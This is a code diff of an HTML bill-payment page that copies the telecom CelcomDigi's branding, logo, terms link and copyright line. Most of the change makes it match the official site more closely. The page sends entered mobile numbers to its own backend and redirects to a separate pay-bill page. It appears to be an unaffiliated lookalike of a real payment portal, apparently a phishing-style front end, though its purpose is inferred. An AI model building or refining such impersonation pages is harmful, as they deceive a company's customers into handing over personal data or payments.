@@ -4,652 +4,337 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>CelcomDigi | Fast and Secure Bill Payment</title>
-  <link rel="icon" href="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/65486312b9b7e2d0c0e1a3c0_favicon.png" />
+  <link rel="icon" href="https://get.celcomdigi.com/global-assets/rnb/favicon/android-chrome-192x192.png" />
   <link rel="stylesheet" href="/get-assets/css/app.css" />
+  <link rel="stylesheet" href="/get-assets/css/icons.css" />
+  <script src="/get-assets/js/lottie.min.js"></script>
   <style>
-    /* ===== RESET & BASE ===== */
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif; background: #fff; color: #1a1a1a; }
-
-    /* ===== HEADER ===== */
-    .header {
-      background: #001871;
-      padding: 14px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      position: sticky;
+    /* ===== CD BACKDROP (Blue gradient background) ===== */
+    .cd-backdrop {
+      background: url('/get-assets/resources/images/bg-arch-edit.webp') no-repeat top right fixed,
+                  linear-gradient(180deg, #001870, #0064dc 100%, transparent 0%);
+      position: fixed;
       top: 0;
-      z-index: 100;
-    }
-    .header-logo img { height: 36px; }
-    .header-actions { display: flex; align-items: center; gap: 12px; }
-    .btn-shop {
-      display: flex; align-items: center; gap: 6px;
-      background: transparent; border: 2px solid #fff;
-      color: #fff; font-size: 14px; font-weight: 600;
-      padding: 8px 18px; border-radius: 50px; cursor: pointer;
-      text-decoration: none; transition: all 0.2s;
-    }
-    .btn-shop:hover { background: rgba(255,255,255,0.15); }
-    .btn-lang {
-      display: flex; align-items: center; gap: 6px;
-      background: transparent; border: 2px solid #fff;
-      color: #fff; font-size: 14px; font-weight: 600;
-      padding: 8px 16px; border-radius: 50px; cursor: pointer;
-      text-decoration: none; transition: all 0.2s;
-    }
-    .btn-lang:hover { background: rgba(255,255,255,0.15); }
-
-    /* ===== HERO BANNER ===== */
-    .hero {
-      background: linear-gradient(135deg, #001870 0%, #0064dc 60%, #0088ff 100%);
-      position: relative;
-      overflow: hidden;
-      padding: 48px 24px 56px;
-      text-align: center;
-    }
-    .hero::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background-image: url('/get-assets/images/bg-arch-edit.webp');
-      background-size: cover;
-      background-position: center;
-      opacity: 0.6;
-    }
-    .hero h1 {
-      position: relative;
-      color: #fff;
-      font-size: clamp(24px, 5vw, 40px);
-      font-weight: 700;
-      letter-spacing: -0.5px;
-    }
-
-    /* ===== MAIN CARD ===== */
-    .main-card {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 4px 32px rgba(0,0,0,0.12);
-      max-width: 520px;
-      margin: -24px auto 40px;
-      padding: 32px 28px;
-      position: relative;
-      z-index: 2;
-    }
-    .card-title {
-      font-size: 20px;
-      font-weight: 700;
-      color: #1a1a1a;
-      margin-bottom: 6px;
-    }
-    .card-subtitle {
-      font-size: 14px;
-      color: #6b7280;
-      margin-bottom: 24px;
-    }
-
-    /* ===== FORM ===== */
-    .form-group { margin-bottom: 16px; }
-    .input-wrapper {
-      position: relative;
-      border: 2px solid #d1d5db;
-      border-radius: 10px;
-      transition: border-color 0.2s;
-      background: #fff;
-    }
-    .input-wrapper:focus-within { border-color: #0064dc; }
-    .input-wrapper.error { border-color: #ef4444; }
-    .input-label {
-      position: absolute;
-      top: 10px; left: 14px;
-      font-size: 11px;
-      font-weight: 600;
-      color: #6b7280;
-      pointer-events: none;
-      transition: all 0.2s;
-    }
-    .input-wrapper.has-value .input-label,
-    .input-wrapper:focus-within .input-label { color: #0064dc; }
-    .input-wrapper.error .input-label { color: #ef4444; }
-    .form-input {
       width: 100%;
-      border: none;
-      outline: none;
-      padding: 28px 14px 10px;
-      font-size: 16px;
-      font-weight: 500;
-      color: #1a1a1a;
-      background: transparent;
-      border-radius: 10px;
+      z-index: -1;
+      left: 0;
+      background-size: contain;
+      height: 50%;
     }
-    .error-msg {
-      color: #ef4444;
-      font-size: 13px;
-      margin-top: 6px;
+
+    /* ===== TAILWIND-LIKE UTILITIES ===== */
+    .bg-celcom-digi-blue { background-color: #001871; }
+    .text-celcom-digi-blue { color: #001871; }
+    .bg-celcom-digi-light-blue { background-color: #0064dc; }
+    .text-celcom-digi-light-blue { color: #0064dc; }
+
+    /* ===== LOADING MODAL ===== */
+    #loadingBackdrop {
       display: none;
     }
-    .error-msg.visible { display: block; }
-    .toggle-link {
-      display: block;
-      color: #0064dc;
-      font-size: 13px;
-      font-weight: 500;
-      margin-top: 10px;
-      cursor: pointer;
-      text-decoration: underline;
+    #loadingBackdrop.show {
+      display: flex;
     }
-    .toggle-link:hover { color: #0052b3; }
+
+    /* ===== ERROR ===== */
+    .border-error { border-color: #ef4444 !important; }
+    .text-error { color: #ef4444; }
+
+    /* ===== DROPDOWN ===== */
+    .dropdown-menu {
+      position: absolute;
+      right: 0;
+      top: calc(100% + 4px);
+      min-width: 80px;
+      z-index: 50;
+    }
+    [x-cloak] { display: none !important; }
+
+    /* ===== FLOATING LABEL ===== */
+    .floating-label-wrapper {
+      position: relative;
+    }
+    .floating-label-wrapper input:not(:placeholder-shown) + label,
+    .floating-label-wrapper input:focus + label {
+      top: 4px !important;
+      font-size: 0.75rem !important;
+      line-height: 1rem !important;
+      color: #6b7280;
+    }
+    .floating-label-wrapper label {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      left: 10px;
+      color: #9ca3af;
+      font-size: 1rem;
+      pointer-events: none;
+      transition: all 0.15s ease;
+    }
+    .floating-label-wrapper input:not(:placeholder-shown) + label,
+    .floating-label-wrapper input:focus + label {
+      top: 6px;
+      transform: none;
+      font-size: 0.7rem;
+      color: #6b7280;
+    }
 
     /* ===== SUBMIT BUTTON ===== */
-    .btn-submit {
-      width: 100%;
-      padding: 14px;
-      background: #0064dc;
-      color: #fff;
-      font-size: 16px;
-      font-weight: 700;
-      border: none;
-      border-radius: 50px;
+    .btn-submit-disabled {
+      background-color: #d1d5db;
+      cursor: not-allowed;
+    }
+    .btn-submit-active {
+      background-color: #0064dc;
       cursor: pointer;
-      margin-top: 20px;
-      transition: all 0.2s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
     }
-    .btn-submit:hover { background: #0052b3; }
-    .btn-submit:disabled { background: #9ca3af; cursor: not-allowed; }
-
-    /* ===== LOADING SPINNER ===== */
-    .spinner {
-      width: 20px; height: 20px;
-      border: 3px solid rgba(255,255,255,0.3);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      display: none;
-    }
-    .btn-submit.loading .spinner { display: block; }
-    .btn-submit.loading .btn-text { display: none; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* ===== LOADING OVERLAY ===== */
-    .loading-overlay {
-      display: none;
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 24, 113, 0.85);
-      z-index: 1000;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-    }
-    .loading-overlay.visible { display: flex; }
-    .loading-logo { margin-bottom: 24px; }
-    .loading-logo img { height: 48px; filter: brightness(0) invert(1); }
-    .loading-spinner-big {
-      width: 56px; height: 56px;
-      border: 5px solid rgba(255,255,255,0.2);
-      border-top-color: #FFD700;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    .loading-text {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-    .loading-subtext {
-      font-size: 14px;
-      color: rgba(255,255,255,0.7);
-    }
-    .loading-steps {
-      margin-top: 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      text-align: left;
-    }
-    .loading-step {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 13px;
-      color: rgba(255,255,255,0.6);
-      transition: color 0.3s;
-    }
-    .loading-step.active { color: #FFD700; }
-    .loading-step.done { color: rgba(255,255,255,0.9); }
-    .step-icon { font-size: 16px; }
-
-    /* ===== BILL RESULT CARD ===== */
-    .bill-result {
-      display: none;
-    }
-    .bill-result.visible { display: block; }
-    .bill-header {
-      background: linear-gradient(135deg, #001870, #0064dc);
-      border-radius: 12px 12px 0 0;
-      padding: 20px;
-      color: #fff;
-      margin: -32px -28px 24px;
-    }
-    .bill-header-top {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 12px;
-    }
-    .bill-label {
-      font-size: 12px;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      color: rgba(255,255,255,0.7);
-    }
-    .bill-number {
-      font-size: 18px;
-      font-weight: 700;
-    }
-    .bill-amount-section {
-      text-align: center;
-      padding: 8px 0;
-    }
-    .bill-amount-label {
-      font-size: 13px;
-      color: rgba(255,255,255,0.7);
-      margin-bottom: 4px;
-    }
-    .bill-amount-value {
-      font-size: 42px;
-      font-weight: 800;
-      color: #FFD700;
-      letter-spacing: -1px;
-    }
-    .bill-due {
-      font-size: 13px;
-      color: rgba(255,255,255,0.8);
-      margin-top: 6px;
+    .btn-submit-active:hover {
+      background-color: #0052b3;
     }
 
-    /* Screenshot display */
-    .bill-screenshot-section {
-      margin: 16px 0;
-    }
-    .bill-screenshot-label {
-      font-size: 12px;
-      font-weight: 600;
-      color: #6b7280;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 8px;
-    }
-    .bill-screenshot {
-      width: 100%;
-      border-radius: 8px;
-      border: 1px solid #e5e7eb;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-    }
-
-    /* Bill details table */
-    .bill-details {
-      background: #f9fafb;
-      border-radius: 10px;
-      padding: 16px;
-      margin: 16px 0;
-    }
-    .bill-detail-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 8px 0;
-      border-bottom: 1px solid #e5e7eb;
-      font-size: 14px;
-    }
-    .bill-detail-row:last-child { border-bottom: none; }
-    .bill-detail-label { color: #6b7280; }
-    .bill-detail-value { font-weight: 600; color: #1a1a1a; }
-    .bill-detail-value.amount { color: #0064dc; font-size: 16px; }
-
-    /* Raw data section */
-    .bill-raw-data {
-      background: #f0f4ff;
-      border: 1px solid #c7d7f8;
-      border-radius: 10px;
-      padding: 16px;
-      margin: 16px 0;
-    }
-    .bill-raw-title {
-      font-size: 13px;
-      font-weight: 700;
-      color: #0064dc;
-      margin-bottom: 10px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .bill-raw-content {
-      font-size: 13px;
-      color: #374151;
-      line-height: 1.6;
-      white-space: pre-wrap;
-      word-break: break-word;
-      max-height: 200px;
-      overflow-y: auto;
-    }
-
-    /* Pay now button */
-    .btn-pay {
-      width: 100%;
-      padding: 14px;
-      background: #FFD700;
-      color: #001871;
-      font-size: 16px;
-      font-weight: 800;
-      border: none;
-      border-radius: 50px;
-      cursor: pointer;
-      margin-top: 16px;
-      transition: all 0.2s;
-      text-decoration: none;
-      display: block;
-      text-align: center;
-    }
-    .btn-pay:hover { background: #FFC200; transform: translateY(-1px); }
-
-    .btn-back {
-      width: 100%;
-      padding: 12px;
-      background: transparent;
-      color: #0064dc;
-      font-size: 14px;
-      font-weight: 600;
-      border: 2px solid #0064dc;
-      border-radius: 50px;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: all 0.2s;
-    }
-    .btn-back:hover { background: #f0f4ff; }
-
-    /* ===== NOTICE ===== */
-    .notice {
-      background: #fffbeb;
-      border: 1px solid #fcd34d;
-      border-radius: 8px;
-      padding: 12px 14px;
-      font-size: 13px;
-      color: #92400e;
-      margin-top: 16px;
-      display: flex;
-      gap: 8px;
-      align-items: flex-start;
-    }
-
-    /* ===== FOOTER ===== */
-    footer {
-      background: #001871;
-      color: rgba(255,255,255,0.6);
-      text-align: center;
-      padding: 20px;
-      font-size: 12px;
-      margin-top: 40px;
-    }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 600px) {
-      .main-card { margin: -20px 16px 32px; padding: 24px 20px; }
-      .hero { padding: 36px 16px 44px; }
-      .bill-header { margin: -24px -20px 20px; }
+    /* ===== SHADOW TOP (mobile) ===== */
+    @media (max-width: 767px) {
+      .shadow-top {
+        box-shadow: 0 -4px 6px -1px rgba(0,0,0,.1), 0 -2px 4px -2px rgba(0,0,0,.1);
+      }
     }
   </style>
 </head>
-<body>
+<body class="font-sans bg-white min-h-screen flex flex-col">
 
-  <!-- HEADER -->
-  <header class="header">
-    <a href="/" class="header-logo">
-      <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
-    </a>
-    <div class="header-actions">
-      <a href="https://shop.celcomdigi.com/home" class="btn-shop" target="_blank">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg>
-        SHOP
-      </a>
-      <a href="#" class="btn-lang">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
-        EN
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
-      </a>
+  <!-- CD Backdrop -->
+  <div class="cd-backdrop"></div>
+
+  <!-- Loading Modal (Lottie) -->
+  <div id="loadingBackdrop" class="fixed inset-0 z-50 flex items-center justify-center bg-white bg-opacity-50 backdrop-blur-sm">
+    <div class="bg-white rounded-2xl p-6 shadow-xl">
+      <div id="lottieContainer" style="width:80px;height:80px;"></div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header class="bg-celcom-digi-blue w-full flex top-0 z-10">
+    <div class="mx-auto w-full px-4 md:container mx-auto">
+      <nav>
+        <div class="flex justify-between h-16 gap-1.5">
+          <a class="w-32 inline-block self-center" href="https://www.celcomdigi.com/">
+            <img alt="CelcomDigi" class="h-8" loading="lazy"
+              src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" />
+          </a>
+          <div class="flex gap-1.5 my-3">
+            <a class="flex border-white items-center rounded-full border py-2.5 px-3.5 text-white gap-1.5 text-xs"
+              href="https://shop.celcomdigi.com/home">
+              <span class="cd-icon icon-shopping-bag-01 text-base"></span>
+              SHOP
+            </a>
+            <div class="relative" id="langDropdown">
+              <a onclick="toggleLang(event)" class="flex items-center bg-white text-celcom-digi-blue rounded-full py-2.5 px-3.5 gap-1.5 cursor-pointer" href="#">
+                <span class="cd-icon icon-globe-02 text-base"></span>
+                <span class="text-xs">EN</span>
+                <span class="cd-icon icon-chevron-down text-sm"></span>
+              </a>
+              <div id="langMenu" class="dropdown-menu bg-white p-2 rounded-3xl text-center border border-gray-300 shadow-md hidden">
+                <a class="text-xs text-celcom-digi-blue" href="https://get.celcomdigi.com/bill-payment/ms">BM</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
     </div>
   </header>
 
-  <!-- HERO -->
-  <div class="hero">
-    <h1>Fast and Secure Bill Payment</h1>
-  </div>
+  <!-- Main Content -->
+  <div class="grow w-full h-full font-sans flex flex-col grow">
+    <div class="flex flex-col flex-1 grow h-full">
+      <div class="flex flex-col flex-1 grow">
+        <div class="p-10 md:container flex flex-col mx-auto w-full lg:w-10/12 xl:w-8/12 text-center text-base px-0 pb-0">
 
-  <!-- LOADING OVERLAY -->
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-logo">
-      <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
-    </div>
-    <div class="loading-spinner-big"></div>
-    <div class="loading-text">Fetching your bill...</div>
-    <div class="loading-subtext">Please wait a moment</div>
-    <div class="loading-steps">
-      <div class="loading-step active" id="step1">
-        <span class="step-icon">🔍</span>
-        <span>Connecting to CelcomDigi...</span>
-      </div>
-      <div class="loading-step" id="step2">
-        <span class="step-icon">📱</span>
-        <span>Verifying mobile number...</span>
-      </div>
-      <div class="loading-step" id="step3">
-        <span class="step-icon">📄</span>
-        <span>Retrieving bill details...</span>
-      </div>
-      <div class="loading-step" id="step4">
-        <span class="step-icon">✅</span>
-        <span>Preparing your bill...</span>
-      </div>
-    </div>
-  </div>
+          <!-- Form Card -->
+          <div class="bg-white shadow-lg rounded-2xl p-5 md:h-min md:flex-none flex grow">
+            <form class="flex flex-col flex-1 grow" id="billForm" onsubmit="handleSubmit(event)">
+              <div class="md:my-2">
+                <h5 class="text-xl md:text-2xl text-gray-800 mb-2 font-bold text-left md:text-center">
+                  Pay Bill
+                </h5>
+                <p class="text-xs md:text-base text-left md:text-center text-gray-600">
+                  Pay for yourself or anyone securely.
+                </p>
+              </div>
 
-  <!-- MAIN CARD -->
-  <div class="main-card">
+              <div class="w-full p-1 rounded-lg md:mb-4 flex flex-col flex-1 grow">
+                <!-- Mobile Number Input -->
+                <div class="flex flex-col mt-4 text-start gap-2 md:mx-24 2xl:mx-48 mb-2">
 
-    <!-- STEP 1: Enter Mobile Number -->
-    <div id="stepForm">
-      <div class="card-title">Pay Bill</div>
-      <div class="card-subtitle">Pay for yourself or anyone securely.</div>
+                  <div class="floating-label-wrapper">
+                    <input
+                      id="mobile_number_input"
+                      type="tel"
+                      placeholder=" "
+                      maxlength="12"
+                      class="border border-gray-300 rounded-lg pt-6 pb-2 pl-2.5 w-full focus:outline-none focus:border-blue-500 text-gray-800 text-base"
+                      oninput="handleNumberInput(this)"
+                      onkeypress="if(event.key==='Enter'){handleSubmit(event)}"
+                    />
+                    <label>Mobile number</label>
+                  </div>
 
-      <div class="form-group">
-        <div class="input-wrapper" id="inputWrapper">
-          <span class="input-label">Mobile number</span>
-          <input
-            type="tel"
-            class="form-input"
-            id="mobile_number_input"
-            placeholder=""
-            autocomplete="tel"
-            inputmode="numeric"
-          />
+                  <!-- Error Message -->
+                  <div id="errorMsg" class="hidden text-error text-xs mt-1"></div>
+
+                  <!-- Terms -->
+                  <p class="text-xs text-gray-500 mt-1">
+                    By clicking 'Submit', you agree to the
+                    <a href="https://www.celcomdigi.com/terms-and-conditions" target="_blank" class="text-celcom-digi-light-blue underline">CelcomDigi Terms and Conditions</a>.
+                  </p>
+                </div>
+
+                <!-- Spacer -->
+                <div class="flex-1 grow"></div>
+
+                <!-- Price Summary + Submit -->
+                <div class="shadow-top max-md:w-full flex md:flex-row items-center justify-between gap-2 p-4 md:p-0 md:mt-4">
+                  <div class="flex flex-col text-left">
+                    <span class="text-xs text-gray-500">Total</span>
+                    <span class="text-xl font-bold text-celcom-digi-light-blue">RM0.00</span>
+                  </div>
+                  <button
+                    type="submit"
+                    id="submit_button"
+                    disabled
+                    class="btn-submit-disabled text-white font-semibold py-3 px-8 rounded-full transition-all duration-200 text-sm w-full md:w-auto"
+                  >
+                    Submit
+                  </button>
+                </div>
+              </div>
+            </form>
+          </div>
+
         </div>
-        <div class="error-msg" id="errorMsg">
-          Please enter a valid/active Celcom or Digi mobile number.
-        </div>
-        <a class="toggle-link" id="toggleLink">Use account number instead</a>
-      </div>
-
-      <button class="btn-submit" id="submitBtn" onclick="checkBill()">
-        <span class="btn-text">Submit</span>
-        <div class="spinner"></div>
-      </button>
-
-      <div class="notice">
-        <span>ℹ️</span>
-        <span>Your bill data is fetched directly from CelcomDigi's system in real time.</span>
       </div>
     </div>
-
-    <!-- STEP 2: Bill Result -->
-    <div id="stepResult" class="bill-result">
-      <!-- Bill header will be injected here -->
-      <div id="billContent"></div>
-
-      <button class="btn-back" onclick="goBack()">← Check Another Number</button>
-    </div>
-
   </div>
 
-  <!-- FOOTER -->
-  <footer>
-    © Copyright 2026 CelcomDigi Berhad [Registration No. 199701009694 (425190-X)]. All Rights Reserved.
+  <!-- Footer -->
+  <footer class="flex bg-celcom-digi-blue w-full text-center mt-0 py-4 px-3 justify-center">
+    <div class="container flex justify-center">
+      <p class="text-white text-xs mb-0">© Copyright 2026 CelcomDigi Berhad [Registration No. 199701009694 (425190-X)]. All Rights Reserved.</p>
+    </div>
   </footer>
 
   <script>
-    const input = document.getElementById('mobile_number_input');
-    const inputWrapper = document.getElementById('inputWrapper');
-    const errorMsg = document.getElementById('errorMsg');
-    const submitBtn = document.getElementById('submitBtn');
-    let useAccountNumber = false;
-
-    // Input formatting
-    input.addEventListener('input', function() {
-      if (this.value.length > 0) {
-        inputWrapper.classList.add('has-value');
-      } else {
-        inputWrapper.classList.remove('has-value');
+    // ===== LANGUAGE DROPDOWN =====
+    function toggleLang(e) {
+      e.preventDefault();
+      const menu = document.getElementById('langMenu');
+      menu.classList.toggle('hidden');
+    }
+    document.addEventListener('click', function(e) {
+      const dropdown = document.getElementById('langDropdown');
+      if (!dropdown.contains(e.target)) {
+        document.getElementById('langMenu').classList.add('hidden');
       }
-      inputWrapper.classList.remove('error');
-      errorMsg.classList.remove('visible');
     });
 
-    // Toggle account number
-    document.getElementById('toggleLink').addEventListener('click', function() {
-      useAccountNumber = !useAccountNumber;
-      if (useAccountNumber) {
-        document.querySelector('.input-label').textContent = 'Account number';
-        input.placeholder = '';
-        this.textContent = 'Use mobile number instead';
-        document.querySelector('.card-subtitle').textContent = 'Enter your CelcomDigi account number.';
+    // ===== LOTTIE LOADING =====
+    let lottieAnim = null;
+
+    function showLoading() {
+      const screen = document.getElementById('loadingBackdrop');
+      screen.classList.add('show');
+      if (!lottieAnim) {
+        lottieAnim = lottie.loadAnimation({
+          container: document.getElementById('lottieContainer'),
+          renderer: 'svg',
+          loop: true,
+          autoplay: true,
+          path: '/get-assets/resources/images/cd-icons/icons-animation/cd-loading.json'
+        });
       } else {
-        document.querySelector('.input-label').textContent = 'Mobile number';
-        input.placeholder = '';
-        this.textContent = 'Use account number instead';
-        document.querySelector('.card-subtitle').textContent = 'Pay for yourself or anyone securely.';
+        lottieAnim.play();
       }
-      input.value = '';
-      inputWrapper.classList.remove('has-value', 'error');
-      errorMsg.classList.remove('visible');
-    });
-
-    // Enter key submit
-    input.addEventListener('keypress', function(e) {
-      if (e.key === 'Enter') checkBill();
-    });
-
-    // Animate loading steps
-    function animateSteps() {
-      const steps = ['step1', 'step2', 'step3', 'step4'];
-      let current = 0;
-      const interval = setInterval(() => {
-        if (current > 0) {
-          document.getElementById(steps[current - 1]).classList.remove('active');
-          document.getElementById(steps[current - 1]).classList.add('done');
-        }
-        if (current < steps.length) {
-          document.getElementById(steps[current]).classList.add('active');
-          current++;
-        } else {
-          clearInterval(interval);
-        }
-      }, 2500);
-      return interval;
     }
 
-    async function checkBill() {
-      const mobileNumber = input.value.trim();
+    function hideLoading() {
+      const screen = document.getElementById('loadingBackdrop');
+      screen.classList.remove('show');
+      if (lottieAnim) lottieAnim.stop();
+    }
 
-      if (!mobileNumber) {
-        inputWrapper.classList.add('error');
-        errorMsg.textContent = 'Please enter your mobile number.';
-        errorMsg.classList.add('visible');
+    // ===== NUMBER INPUT HANDLER =====
+    function handleNumberInput(el) {
+      let val = el.value.replace(/\D/g, '');
+      if (val.length > 12) val = val.substring(0, 12);
+      el.value = val;
+      enableSubmitButton(val);
+      // Clear error
+      document.getElementById('errorMsg').classList.add('hidden');
+      el.classList.remove('border-error');
+    }
+
+    // ===== ENABLE SUBMIT BUTTON =====
+    function enableSubmitButton(val) {
+      const btn = document.getElementById('submit_button');
+      const isValid = val && val.length >= 9;
+      if (isValid) {
+        btn.disabled = false;
+        btn.classList.remove('btn-submit-disabled');
+        btn.classList.add('btn-submit-active');
+      } else {
+        btn.disabled = true;
+        btn.classList.add('btn-submit-disabled');
+        btn.classList.remove('btn-submit-active');
+      }
+    }
+
+    // ===== FORM SUBMIT =====
+    async function handleSubmit(e) {
+      e.preventDefault();
+      let number = document.getElementById('mobile_number_input').value.trim();
+      const errorMsg = document.getElementById('errorMsg');
+      const input = document.getElementById('mobile_number_input');
+
+      if (!number || number.length < 9) {
+        errorMsg.textContent = 'Please enter a valid mobile number.';
+        errorMsg.classList.remove('hidden');
+        input.classList.add('border-error');
         return;
       }
 
-      // Show loading overlay
-      const overlay = document.getElementById('loadingOverlay');
-      overlay.classList.add('visible');
-      submitBtn.disabled = true;
+      // Auto-prefix with 60 if starts with 0
+      if (number.startsWith('0')) {
+        number = '6' + number;
+      } else if (!number.startsWith('6')) {
+        number = '60' + number;
+      }
 
-      // Reset steps
-      ['step1','step2','step3','step4'].forEach(s => {
-        document.getElementById(s).classList.remove('active', 'done');
-      });
-      document.getElementById('step1').classList.add('active');
-      const stepInterval = animateSteps();
+      errorMsg.classList.add('hidden');
+      input.classList.remove('border-error');
+      showLoading();
 
       try {
         const response = await fetch('/api/bill-check', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ mobileNumber, useAccountNumber })
+          body: JSON.stringify({ mobileNumber: number })
         });
 
         const data = await response.json();
-        clearInterval(stepInterval);
-        overlay.classList.remove('visible');
-        submitBtn.disabled = false;
+        hideLoading();
 
-        if (!data.success) {
-          inputWrapper.classList.add('error');
-          errorMsg.textContent = data.error || 'Invalid number. Please try again.';
-          errorMsg.classList.add('visible');
-          return;
+        if (data.success) {
+          const carrier = data.carrier || 'CELCOMDIGI';
+          window.location.href = `/pay-bill?number=${encodeURIComponent(number)}&carrier=${encodeURIComponent(carrier.toUpperCase())}`;
+        } else {
+          errorMsg.textContent = data.error || 'Please enter an active Celcom or Digi postpaid mobile number.';
+          errorMsg.classList.remove('hidden');
+          input.classList.add('border-error');
         }
-
-        // Show bill result
-        displayBillResult(data, mobileNumber);
-
       } catch (err) {
-        clearInterval(stepInterval);
-        overlay.classList.remove('visible');
-        submitBtn.disabled = false;
-        inputWrapper.classList.add('error');
+        hideLoading();
         errorMsg.textContent = 'Connection error. Please try again.';
-        errorMsg.classList.add('visible');
+        errorMsg.classList.remove('hidden');
       }
-    }
-
-    function displayBillResult(data, mobileNumber) {
-      // Detect carrier from data
-      let carrier = 'CELCOMDIGI';
-      if (data.carrier) {
-        carrier = data.carrier.toUpperCase();
-      } else if (data.rawSections) {
-        const text = data.rawSections.join(' ').toUpperCase();
-        if (text.includes('DIGI')) carrier = 'DIGI';
-        else if (text.includes('CELCOM')) carrier = 'CELCOM';
-      }
-      // Format number with 60 prefix
-      const cleanNumber = mobileNumber.replace(/^0/, '60');
-      // Redirect to pay-bill page (like original CelcomDigi)
-      window.location.href = `/pay-bill?number=${encodeURIComponent(cleanNumber)}&carrier=${encodeURIComponent(carrier)}`;
-    }
-
-    function goBack() {
-      document.getElementById('stepForm').style.display = 'block';
-      document.getElementById('stepResult').classList.remove('visible');
-      input.value = '';
-      inputWrapper.classList.remove('has-value', 'error');
-      errorMsg.classList.remove('visible');
     }
   </script>
 </body>
